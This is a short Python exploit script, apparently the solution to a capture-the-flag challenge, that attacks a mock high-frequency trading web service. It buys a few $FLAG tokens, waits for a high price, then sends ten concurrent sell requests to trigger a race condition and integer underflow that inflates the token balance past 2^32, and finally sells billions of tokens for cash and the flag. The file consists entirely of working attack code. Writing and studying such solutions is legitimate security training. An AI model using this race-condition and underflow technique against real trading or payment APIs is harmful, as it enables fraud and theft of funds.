import requests
import time
from concurrent.futures import ThreadPoolExecutor

target = "https://hft-719fda.chal.zip"


def query():
    return requests.get(f"{target}/query").json()["price"]


def account():
    return requests.post(f"{target}/challenge").text.strip()


def buy(acc, amt):
    res = requests.post(f"{target}/{acc}/trade", json={"op": 0, "amt": amt}).text
    return res


def sell(acc, amt):
    return requests.post(f"{target}/{acc}/trade", json={"op": 1, "amt": amt}).text


def queryAccount(acc):
    return requests.get(f"{target}/{acc}").json()


acc = account()
print("Created account", acc)

if msg := queryAccount(acc)["message"]:
    print(msg)
    exit()


buy(acc, 5)

print("Bought 5 $FLAG")

price = query()
while price < pow(10, 7):
    time.sleep(1)
    price = query()

print("Integer underflowing by selling 10 $FLAG at", price)

with ThreadPoolExecutor(max_workers=10) as e:
    for _ in range(10):
        e.submit(sell, acc, 1)

stats = queryAccount(acc)
print(stats)
assert stats["flag"] > pow(2, 32)


price = query()
while price < pow(10, 7):
    time.sleep(1)
    price = query()

print("Selling", pow(2, 31), "$FLAG at", price)
sell(acc, pow(2, 31))

print("Cash", queryAccount(acc)["cash"])
time.sleep(15)
print(queryAccount(acc)["message"])
